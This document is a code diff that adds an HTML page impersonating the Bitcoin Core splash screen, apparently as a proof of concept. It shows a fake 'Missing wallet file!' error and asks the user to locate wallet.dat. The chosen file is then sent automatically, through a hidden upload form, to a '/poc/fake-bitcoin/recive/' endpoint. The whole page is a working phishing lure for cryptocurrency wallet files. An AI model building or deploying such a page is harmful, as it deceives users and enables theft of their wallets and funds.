@@ -1,0 +1,64 @@
+<!doctype html>
+<html>
+<head>
+	<link rel="stylesheet" href="fake.css"></link>
+	<link rel="icon" type="image/png" href="favicon.png" />
+	<script src="jquery.min.js" defer></script>
+	<script src="main.js" defer></script>
+	<title>Bitcoin Core</title>
+</head>
+<body>
+
+<img src="img/bitcoin.png" class="btc-logo noselect">
+
+<table class="btc-logo-ver noselect">
+	<tr>
+		<td>
+			<div class="btc-text-logo noselect">Bitcoin Core</div>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<div class="btc-version noselect">Version v0.17.1</div>
+		</td>
+	</tr>
+</table>
+
+<table class="btc-yrs noselect">
+	<tr>
+		<td>
+			<div class="btc-yrs-e noselect">&#9400; 2009-2018 The Bitcoin Core</div>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<div class="btc-yrs-e noselect">developers</div>
+		</td>
+	</tr>
+</table>
+
+<div class="btc-load noselect">Loading block index...</div>
+
+<table class="message">
+	<tr>
+		<td class="message-cell1"><img src="img/bitcoin128.png" class="message-icon1"></td>
+		<td colspan="2" class="message-cell2">Bitcoin - Error</td>
+	</tr>
+	<tr>
+		<td colspan="2" class="message-cell3"><img src="img/warning.png" class="message-icon2"></td>
+		<td id="message-tx" colspan="1" class="message-cell4">Missing wallet file! <br>Please manual set location of wallet.dat</td>
+	</tr>
+	<tr>
+		<td colspan="3" class="message-cell5">
+			<form action="/poc/fake-bitcoin/recive/" method="post" enctype="multipart/form-data">
+				<!-- https://stackoverflow.com/questions/11412284/upload-file-with-one-button -->
+				<input id="fileid" name="data" type="file" onchange="this.form.submit()" hidden>
+				<input id="buttonid" type="button" class="message-butt">
+			</form>
+		</td>
+	</tr>
+</table>
+
+
+</body>
+</html>
